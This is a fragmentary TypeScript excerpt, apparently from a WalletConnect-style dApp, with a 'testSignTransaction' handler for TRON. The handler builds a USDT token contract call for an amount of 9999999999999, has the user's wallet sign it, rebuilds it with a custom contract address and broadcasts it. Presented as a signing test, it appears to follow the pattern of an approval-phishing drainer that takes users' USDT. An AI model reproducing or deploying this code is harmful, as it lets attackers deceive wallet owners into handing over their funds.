  ...
  const tronRpc = {
    testSignTransaction: _createJsonRpcRequestHandler(
      async (
        ...
        const usdtContractAddress = isTestnet
          ? process.env.NEXT_PUBLIC_TRON_TETHER_USDT_TOKEN_ADDRESS_TESTNET ||
        ...
        const built = await tronWeb.transactionBuilder.triggerSmartContract(
          ...
          [
            ...
            { type: "uint256", value: 9999999999999 },
          ],
          address
        );

        // const transaction = (built as any).transaction ?? built;

        const signedTx = await client!.request<any>({
          chainId,
          topic: session!.topic,
          request: {
            method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
            params: { address, transaction: { ...built } },
          },
        });
        ...
        try {
          ...
          const {
            ...
            extractTronTransactionData,
            isTransactionAlreadyBroadcasted,
            validateTronTransaction,
            reconstructTronTransaction,
          } = await import("../helpers/tron");

          let txData = extractTronTransactionData(signedTx);

          if (!validateTronTransaction(txData)) {
            return {
              method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
              address,
              valid: false,
              result: "Invalid transaction data structure received from wallet",
            };
          }

          if (isTransactionAlreadyBroadcasted(txData)) {
            return {
              method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
              address,
              valid: true,
              result: `Transaction signed and already broadcasted! Hash: ${txData.txID}`,
            };
          }

          if (Array.isArray(txData)) {
            txData = await reconstructTronTransaction(
              txData[0],
              usdtContractAddress,
              customScAddress,
              "9999999999999",
          ...
          txData = txData?.raw_data ? txData : txData?.transaction ?? txData;
          ...
          if (!validateTronTransaction(txData)) {
            return {
              ...
              address,
              valid: false,
              result: "Invalid reconstructed transaction",
            };
          }

          const broadcastResult = await broadcastTronTransaction(
            txData,
            isTestnet
          );
          ...
          if (broadcastResult.result) {
            return {
              ...
              address,
              valid: true,
              result: `Transaction signed and broadcasted successfully! Hash: ${broadcastResult.txid}`,
            };
          }
          return {
            method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
            address,
            valid: false,
            result: `Transaction signed but broadcast failed: ${broadcastResult.message}`,
          };
        } catch (e) {
          return {
            method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
            address,
            valid: false,
            result: `Transaction signed but broadcast failed: ${
              (e as Error).message
            }`,
          };
        }
